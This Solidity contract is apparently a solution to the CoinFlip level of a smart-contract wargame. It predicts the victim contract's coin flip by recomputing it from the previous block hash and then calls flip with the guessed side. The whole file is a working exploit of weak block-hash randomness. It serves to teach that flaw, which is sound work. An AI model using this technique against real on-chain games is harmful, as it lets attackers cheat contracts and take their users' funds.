// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../levels/CoinFlip.sol';

contract CoinFlipAttack {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack(address _victim) public returns (bool) {
    CoinFlip coinflip = CoinFlip(_victim);
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coinflip.flip(side);
    return side;
  }
}